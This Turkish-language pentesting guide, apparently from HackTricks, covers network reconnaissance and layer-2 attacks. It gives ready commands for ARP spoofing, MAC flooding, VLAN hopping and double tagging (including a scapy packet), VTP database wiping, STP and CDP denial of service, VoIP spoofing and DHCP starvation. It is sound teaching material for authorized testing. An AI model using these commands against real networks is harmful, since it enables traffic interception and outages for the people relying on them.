# Pentesting Ağ

{{#include ../../banners/hacktricks-training.md}}



## Dışarıdan hosts keşfetme

Bu, **kısa bir bölüm** olacak; **İnternet** üzerinden **yanıt veren IP'leri** nasıl bulacağınız hakkında.\ Bu durumda elinizde bazı **IP kapsamları** (hatta birkaç **aralık**) olabilir ve hangi **IP'lerin yanıt verdiğini** bulmanız yeterlidir.

### ICMP

Bu, bir host'un ayakta olup olmadığını tespit etmenin **en kolay** ve **en hızlı** yoludur.\ Bazı **ICMP** paketleri göndermeyi deneyebilir ve **yanıt bekleyebilirsiniz**. En kolay yol sadece bir **echo request** göndermek ve yanıt beklemektir. Bunu basit bir `ping` veya aralıklar için `fping` ile yapabilirsiniz **aralık**.\ Ayrıca diğer tip ICMP paketlerini göndermek için **nmap** kullanabilirsiniz (bu, yaygın ICMP echo request-yanıt filtrelerini atlatmaya yardımcı olur).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Çoğu durumda tüm ICMP packets filtrelendiğini görmek çok yaygındır. Bu yüzden bir host'un ayakta olup olmadığını kontrol etmek için yapabileceğiniz tek şey **try to find open ports**. Her host'un **65535 ports** vardır; bu nedenle kapsamınız "büyük" ise her host'un **each port**'unu test edip açık olup olmadığını kontrol etmeniz **cannot** — bu çok zaman alır.\
O zaman ihtiyacınız olan bir **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) ve en çok kullanılan **ports more used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Bu adımı `nmap` ile de gerçekleştirebilirsiniz, ancak daha yavaştır ve `nmap` hostları ayakta tespit etmede sorunlar yaşar.

### HTTP Port Keşfi

Bu, sadece TCP port keşfidir; **HTTP'yi keşfetmeye odaklanmak** **services** istediğinizde kullanışlıdır:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Ayrıca bir **UDP port open** olup olmadığını kontrol ederek bir **host**a **daha fazla dikkat etmeniz** gerekip gerekmediğine karar vermeyi deneyebilirsiniz. UDP servisleri genellikle boş bir **UDP probe packet**'e **hiçbir veri** ile **yanıt vermez**, bu yüzden bir portun filtrelenip filtrelenmediğini veya açık olup olmadığını söylemek zordur. Bunu belirlemenin en kolay yolu, çalışan servise ilişkin bir paket göndermektir; hangi servisin çalıştığını bilmediğiniz için, port numarasına göre en olası olanlarını denemelisiniz:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Önce önerilen nmap satırı, **/24** aralığındaki her host'ta **top 1000 UDP ports**'u test edecek ancak sadece bu bile **>20min** sürecektir. Eğer **en hızlı sonuçlar** istiyorsanız [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` kullanabilirsiniz. Bu, bu **UDP probes**'ları beklenen **expected port**'larına gönderecektir (bir /24 aralığı için bu sadece 1 dakika sürecektir): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Keşfi
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Burada yazıldığı sırada bilinen tüm Wifi attacks hakkında güzel bir rehber bulabilirsiniz:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Ağın içinden hostları keşfetme

Ağın içindeyseniz, yapmak isteyeceğiniz ilk şeylerden biri **diğer hostları keşfetmek** olacaktır. Ne kadar **gürültü** çıkarabileceğinize/çıkarmak istediğinize bağlı olarak farklı eylemler gerçekleştirilebilir:

### Pasif

Bağlı bir ağ içinde hostları pasif olarak keşfetmek için bu araçları kullanabilirsiniz:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktif

[_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) bölümünde bahsedilen tekniklerin burada da **uygulanabileceğini** unutmayın.\
Ancak, diğer hostlarla aynı ağda olduğunuz için, daha fazla şey yapabilirsiniz:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktif ICMP

Dışarıdan host keşfi bölümünde anlatılan tekniklerin ([_**ICMP**_](#icmp)) burada da **uygulanabileceğini** unutmayın.  
Ancak diğer hostlarla **aynı ağ**da olduğunuz için **daha fazla şey** yapabilirsiniz:

- Eğer bir **subnet broadcast address**'e **ping** atarsanız, ping **her host**'a ulaşmalı ve onlar size **yanıt verebilir**: `ping -b 10.10.5.255`
- **network broadcast address**'e **ping** atarak **diğer subnets** içindeki hostları bile bulabilirsiniz: `ping -b 255.255.255.255`
- `nmap`'in `-PE`, `-PP`, `-PM` bayraklarını kullanarak sırasıyla **ICMPv4 echo**, **timestamp** ve **subnet mask requests** gönderip host keşfi yapın: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan, bilgisayarları bir **ağ mesajı** ile **açmak** için kullanılır. Magic packet ile bilgisayarı açmak için kullanılan paket, sadece bir **MAC Dst** sağlanan ve aynı paketin içinde **16 kez tekrar edilen** bir pakettir.  
Bu tür paketler genellikle bir **ethernet 0x0842** içinde veya **UDP packet to port 9** olarak gönderilir.  
Eğer **hiç \[MAC]** sağlanmazsa, paket **broadcast ethernet**'e gönderilir (ve tekrar edilen MAC, broadcast MAC olacaktır).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Host Taraması

Derinlemesine taramak istediğiniz tüm IP'leri (harici veya dahili) keşfettikten sonra, farklı işlemler gerçekleştirilebilir.

### TCP

- **Açık** port: _SYN --> SYN/ACK --> RST_
- **Kapalı** port: _SYN --> RST/ACK_
- **Filtrelenmiş** port: _SYN --> \[NO RESPONSE]_
- **Filtrelenmiş** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Bir UDP portunu taramak için 2 seçenek vardır:

- Bir **UDP packet** gönderin ve port **closed** ise yanıt olarak _**ICMP unreachable**_ olup olmadığını kontrol edin (birçok durumda ICMP **filtered** olur, bu yüzden portun açık mı kapalı mı olduğuna dair bilgi alamayabilirsiniz).
- Bir **formatted datagrams** göndererek bir **service**'ten yanıt almaya çalışın (ör. DNS, DHCP, TFTP ve diğerleri, _nmap-payloads_ içinde listelendiği gibi). Eğer bir **response** alırsanız, port **open**'dir.

**Nmap** her iki seçeneği de "-sV" kullanarak **mix both** yapacaktır (UDP scans are very slow), ancak unutmayın ki UDP scans, TCP scans'tan daha yavaştır:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)**, **TCP (Transmission Control Protocol)** ve **UDP (User Datagram Protocol)** ile birlikte kullanılmak üzere tasarlanmıştır. Temel amacı, IP ağları üzerinden telekomünikasyon verilerinin taşınmasını kolaylaştırmak olup, **Signaling System 7 (SS7)**'de bulunan birçok güvenilirlik özelliğini yansıtır. **SCTP**, SS7 sinyallerini IP ağları üzerinden taşımayı amaçlayan **SIGTRAN** protokol ailesinin temel bir bileşenidir.

**SCTP** desteği **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** ve **VxWorks** gibi çeşitli işletim sistemleri tarafından sağlanır; bu da onun telekomünikasyon ve ağ alanında geniş kabul ve kullanımını gösterir.

nmap tarafından SCTP için iki farklı tarama sunulur: _-sY_ ve _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **More nmap options**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Dahili IP Adreslerini Ortaya Çıkarma

**Yanlış yapılandırılmış yönlendiriciler, güvenlik duvarları ve ağ cihazları** bazen ağ taramalarına **herkese açık olmayan kaynak adresleri** kullanarak yanıt verir. Test sırasında özel adreslerden gelen paketleri tespit etmek için **tcpdump** kullanılabilir. Özellikle Kali Linux üzerinde, genel Internet'ten erişilebilen **eth2 interface** üzerinde paketler yakalanabilir. Kurulumunuz bir NAT veya bir Firewall arkasındaysa, bu tür paketlerin muhtemelen filtreleneceğini not etmek önemlidir.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing sırasında yakalanan frames ve packets'i inceleyerek IP ranges, subnet sizes, MAC addresses ve hostnames hakkında ayrıntıları öğrenebilirsiniz. Ağ yanlış yapılandırılmışsa veya switching fabric under stress durumundaysa, saldırganlar passive network sniffing yoluyla hassas materyal yakalayabilir.

Eğer switched Ethernet network düzgün yapılandırılmışsa, yalnızca broadcast frames ve MAC address'inize yönelik materyali görürsünüz.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Ayrıca, SSH oturumu üzerinden Wireshark'ı GUI olarak kullanarak uzak bir makineden paketleri gerçek zamanlı yakalayabilirsiniz.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Tabii ki.

### credentials'ı Yakalama

Bir pcap dosyasından veya canlı bir interface'ten credentials ayrıştırmak için [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) gibi araçları kullanabilirsiniz.

## LAN saldırıları

### ARP spoofing

ARP Spoofing, bir makinenin IP'sinin cihazımızın MAC adresine ait olduğunu göstermek için gratuitous ARPResponses göndermeyi içerir. Kurban ARP tablosunu değiştirir ve sahtelenen IP ile iletişim kurmak istediğinde her seferinde bizim makinemize başvurur.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Switch’in CAM table’ını, farklı source mac address’lere sahip çok sayıda paket göndererek doldurun. CAM table dolduğunda switch hub gibi davranmaya başlar (tüm trafiği broadcast eder).
```bash
macof -i <interface>
```
Modern switch'lerde bu zafiyet giderilmiştir.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)**, link layer seviyesi için trunking için otomatik bir sistemi kolaylaştırmak üzere tasarlanmıştır; switchlerin portları otomatik olarak trunk (Trunk) veya trunk olmayan moda seçmesine olanak tanır. **DTP** kullanımının yaygın olması genellikle yetersiz ağ tasarımının bir göstergesi olarak kabul edilir; bu yüzden trunkların yalnızca gerekli olduğu yerlerde elle yapılandırılması ve uygun dokümantasyonun sağlanması önemlidir.

Varsayılan olarak, switch portları Dynamic Auto modunda çalışacak şekilde ayarlanmıştır; yani komşu bir switch tarafından tetiklenirse trunking başlatmaya hazırdırlar. Bir pentester veya attacker switch'e bağlanıp bir DTP Desirable frame gönderdiğinde güvenlik riski ortaya çıkar; bu, portun trunk mode'a geçmesini sağlar. Bu işlem sayesinde attacker, STP frame analizleri yoluyla VLANları enumerate edebilir ve sanal arayüzler kurarak VLAN segmentasyonunu atlatabilir.

Birçok switch'te varsayılan olarak DTP'nin bulunması, saldırganların bir switch davranışını taklit ederek tüm VLAN'lardaki trafiğe erişim elde etmesine olanak tanıyabilir. The script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) bir arabirimi izlemek için kullanılır; switch'in Default, Trunk, Dynamic, Auto veya Access modunda olup olmadığını ortaya çıkarır — sonuncusu VLAN hopping attacks'e karşı bağışık tek yapılandırmadır. Bu araç switch'in zafiyet durumunu değerlendirir.

Ağda zafiyet tespit edilirse, _**Yersinia**_ aracı DTP protokolü üzerinden "enable trunking" yapmak için kullanılabilir; bu da tüm VLAN'lardan gelen paketlerin gözlemlenmesine izin verir.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLANs'leri enumerate etmek için DTP Desirable frame'i [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** scripti ile oluşturmak da mümkündür. D**iğer hiçbir koşulda scripti durdurmayın. Her üç saniyede bir DTP Desirable enjekte eder. **Switch üzerindeki dinamik olarak oluşturulan trunk kanalları yalnızca beş dakika boyunca var olur. Beş dakika sonra trunk düşer.**
```
sudo python3 DTPHijacking.py --interface eth0
```
I would like to point out that **Access/Desirable (0x03)** indicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And **802.1Q/802.1Q (0xa5** indicates the **802.1Q** encapsulation type.

STP çerçevelerini analiz ederek, **VLAN 30 ve VLAN 60'ın varlığını öğreniyoruz.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Belirli VLAN'lara saldırma

VLAN ID'lerini ve IP adreslerini öğrendikten sonra, **belirli bir VLAN'a saldırmak için bir sanal arayüz yapılandırabilirsiniz**.\
DHCP kullanılabilir değilse, statik bir IP adresi atamak için _ifconfig_ kullanın.

<details>
<summary>VLAN arayüz yapılandırması (örnek)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Tartışılan **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** diğer VLAN'larda gerçekleştirilen saldırılar araç tarafından **otomatik olarak gerçekleştirilmektedir**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Eğer bir attacker, hedef host'un **MAC, IP and VLAN ID of the victim host** değerlerini biliyorsa, kendi atanan VLAN'ı ile hedefin VLAN'ını kullanarak bir çerçeveyi **double tag a frame** ile etiketlemeyi ve paket göndermeyi deneyebilir. Hedef **victim won't be able to connect back** olacağından, saldırgan için en iyi seçenek, SNMP gibi bazı ilginç işlemler gerçekleştirebilen protokollerle **best option for the attacker is communicate via UDP** yoluyla iletişim kurmaktır.

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.

![](<../../images/image (190).png>)

Bu saldırıyı gerçekleştirmek için scapy kullanabilirsiniz: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Eğer doğrudan bağlı olduğunuz bir switch'e **erişiminiz varsa**, ağ içindeki **VLAN segmentation'ı bypass etme** imkânına sahipsiniz. Basitçe portu **trunk mode**'a (trunk olarak da bilinir) alın, hedef VLAN'ların ID'leri ile **virtual interfaces** oluşturun ve bir IP adresi yapılandırın. Adresi dinamik olarak almak için **DHCP** isteyebilir veya duruma göre statik olarak yapılandırabilirsiniz.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

Bazı ortamlarda, örneğin guest wireless networks gibi yerlerde, **port isolation (also known as private VLAN)** ayarları, bir wireless access point'e bağlı istemcilerin birbirleriyle doğrudan iletişim kurmasını engellemek için uygulanır. Ancak, bu izolasyon önlemlerini aşabilen bir teknik tespit edilmiştir. Bu teknik, ağ ACL'lerinin eksikliğinden veya yanlış yapılandırılmasından yararlanarak IP paketlerinin aynı ağdaki başka bir istemciye ulaşmak üzere bir yönlendirici (router) üzerinden yönlendirilmesini sağlar.

Saldırı, **hedef istemcinin IP adresini taşıyan fakat router'ın MAC adresine sahip bir paket** oluşturularak gerçekleştirilir. Bu, router'ın paketi yanlışlıkla hedef istemciye iletmesine neden olur. Bu yaklaşım, Double Tagging Attacks ile benzerlik gösterir; burada, kurbana erişimi olan bir host'un kontrol edilebilmesi güvenlik açığından yararlanmak için kullanılır.

Key Steps of the Attack:

1. Crafting a Packet: Hedef istemcinin IP adresini içeren ancak router'ın MAC adresine sahip özel bir paket hazırlanır.
2. Exploiting Router Behavior: Hazırlanan paket router'a gönderilir; yapılandırma nedeniyle router paketi hedef istemciye yönlendirir ve private VLAN tarafından sağlanan izolasyonu bypass eder.

### VTP Attacks

VTP (VLAN Trunking Protocol) VLAN yönetimini merkezileştirir. VLAN veritabanı bütünlüğünü korumak için revision number'ları kullanır; yapılan herhangi bir değişiklik bu numarayı artırır. Switch'ler daha yüksek revision number'a sahip yapılandırmaları benimser ve kendi VLAN veritabanlarını günceller.

#### VTP Domain Roles

- **VTP Server:** VLAN'ları yönetir—oluşturur, siler, değiştirir. Domain üyelerine VTP announcements yayınlar.
- **VTP Client:** VLAN veritabanını senkronize etmek için VTP announcements alır. Bu rol local VLAN yapılandırma değişikliklerinden men edilmiştir.
- **VTP Transparent:** VTP güncellemelerine katılmaz ancak VTP announcements'ları iletir. VTP attacks'dan etkilenmez ve revision number'ı sabit sıfır olarak kalır.

#### VTP Advertisement Types

- **Summary Advertisement:** VTP server tarafından her 300 saniyede bir yayınlanır ve temel domain bilgilerini taşır.
- **Subset Advertisement:** VLAN yapılandırma değişikliklerinin ardından gönderilir.
- **Advertisement Request:** Genellikle daha yüksek bir configuration revision number algılandığında, bir VTP client tarafından Summary Advertisement talep etmek için gönderilir.

VTP zaafları yalnızca trunk ports üzerinden sömürülebilir çünkü VTP announcements sadece bu portlar üzerinden dolaşır. Post-DTP attack senaryoları VTP'ye yönelebilir. Yersinia gibi araçlar VTP attacks gerçekleştirmeyi kolaylaştırabilir; amaç genellikle VLAN veritabanını silmek ve böylece ağı etkisiz hale getirmektir.

Note: Bu tartışma VTP version 1 (VTPv1) ile ilgilidir.
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Yersinia'nin graphical mode'unda, VLAN veritabanını temizlemek için deleting all VTP vlans seçeneğini seçin.

### STP Attacks

**Eğer arayüzlerinizde BPDU çerçevelerini yakalayamıyorsanız, bir STP attack'ında başarılı olmanız muhtemel değildir.**

#### **STP BPDU DoS**

Çok sayıda BPDU — TCP (Topology Change Notification) veya Conf (topoloji oluşturulduğunda gönderilen BPDU'lar) — gönderilmesi halinde switches aşırı yüklenir ve düzgün çalışmayı durdurur.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Bir TCP gönderildiğinde, switch'lerin CAM table'ı 15s içinde silinir. Eğer bu tür paketleri sürekli olarak gönderiyorsanız, CAM table sürekli olarak (veya her 15segs'te) yeniden başlatılacak ve yeniden başlatıldığında switch hub gibi davranır.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Saldırgan, ağın STP root'u olmak için bir switch'in davranışını taklit eder. Böylece daha fazla veri onun üzerinden geçer. Bu, iki farklı switch'e bağlı olduğunuzda ilginçtir.\
Bu, BPDUs CONF paketleri gönderilerek yapılır; paketler, saldırganın bildirdiği **öncelik** değerinin gerçek root switch'in öncelik değerinden daha düşük olduğunu belirtir.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Eğer attacker 2 switch'e bağlıysa, yeni ağacın root'u olabilir ve bu switch'ler arasındaki tüm trafik onun üzerinden geçer** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) is essential for communication between CISCO devices, allowing them to **identify each other and share configuration details**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP, tüm portlardan bilgi yayınlayacak şekilde yapılandırılabilir; bu da bir güvenlik riski oluşturabilir. Bir saldırgan switch portuna bağlandıktan sonra **Wireshark**, **tcpdump** veya **Yersinia** gibi ağ sniffer'ları çalıştırabilir. Bu işlem, cihazın modeli ve çalıştırdığı Cisco IOS sürümü dahil olmak üzere ağ cihazına ait hassas bilgileri ortaya çıkarabilir. Saldırgan daha sonra belirlenen Cisco IOS sürümündeki spesifik zafiyetleri hedefleyebilir.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Daha agresif bir yaklaşım, meşru CISCO cihazları taklit ederek switch'in belleğini doldurup bir Denial of Service (DoS) attack başlatmayı içerir. Aşağıda, test amaçlı tasarlanmış bir network aracı olan Yersinia kullanılarak böyle bir saldırıyı başlatmak için komut dizisi verilmiştir:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
#### CDP Impersonation Attack

Bu saldırı sırasında switch'in CPU'su ve CDP neighbor table'ı ağır şekilde yüklenir; aşırı kaynak tüketimi nedeniyle sıklıkla **“ağ felci”** oluşur.
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP Saldırıları ve VoIP Hopper Aracı

VoIP telefonlar, giderek IoT cihazlarıyla entegre edilerek özel telefon numaraları aracılığıyla kapı açma veya termostat kontrolü gibi işlevler sunar. Ancak bu entegrasyon güvenlik riskleri yaratabilir.

Araç [**voiphopper**](http://voiphopper.sourceforge.net), çeşitli ortamlarda (Cisco, Avaya, Nortel, Alcatel-Lucent) bir VoIP telefonunu emüle edecek şekilde tasarlanmıştır. CDP, DHCP, LLDP-MED ve 802.1Q ARP gibi protokoller kullanarak ses ağının VLAN ID'sini keşfeder.

**VoIP Hopper**, Cisco Discovery Protocol (CDP) için üç mod sunar:

1. **Sniff Mode** (`-c 0`): VLAN ID'sini belirlemek için ağ paketlerini analiz eder.
2. **Spoof Mode** (`-c 1`): Gerçek bir VoIP cihazına ait paketleri taklit eden özel paketler oluşturur.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Belirli bir Cisco IP phone modeline ait paketlerle özdeş paketler gönderir.

Hız için tercih edilen mod üçüncü moddur. Şunun belirtilmesi gerekir:

- Saldırganın ağ arayüzü (`-i` parameter).
- Emüle edilen VoIP cihazının adı (`-E` parameter), Cisco adlandırma formatına uymalıdır (ör. SEP ardından bir MAC adresi).

Kurumsal ortamlarda, mevcut bir VoIP cihazını taklit etmek için şunlar yapılabilir:

- Telefon üzerindeki MAC etiketini kontrol etmek.
- Model bilgilerini görmek için telefonun ekran ayarlarında gezinmek.
- VoIP cihazını bir laptopa bağlayıp Wireshark kullanarak CDP isteklerini gözlemlemek.

Üçüncü modda aracı çalıştırmak için örnek bir komut şöyle olur:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** DHCP sunucularına karşı gerçekleştirilebilir. Birincisi, mevcut tüm IP adreslerini tüketmek için **yeterli sayıda sahte host simüle etmek**ten oluşur.\
Bu saldırı, yalnızca DHCP sunucusunun yanıtlarını görebiliyor ve protokolü tamamlayabiliyorsanız (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)) işe yarar. Örneğin, bu **Wifi networks'te mümkün değildir**.

DHCP DoS gerçekleştirmek için başka bir yol, **kaynak IP olarak mümkün olan her IP'yi kullanarak DHCP-RELEASE paketi göndermektir**. Böylece sunucu herkesin IP'yi kullanmayı bıraktığını düşünecektir.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bunu daha otomatik yapmak için [DHCPing](https://github.com/kamorin/DHCPig) aracını kullanabilirsiniz.

Bahsedilen DoS saldırılarını, istemcileri ortamda yeni kiralamalar (leases) almaya zorlamak ve meşru sunucuları tükenip yanıt veremez hale getirmek için kullanabilirsiniz. Böylece meşru sunucular yeniden bağlanmaya çalıştığında, **bir sonraki saldırıda belirtilen kötü amaçlı değerleri sunabilirsiniz**.

#### Kötü amaçlı değerleri ayarlama

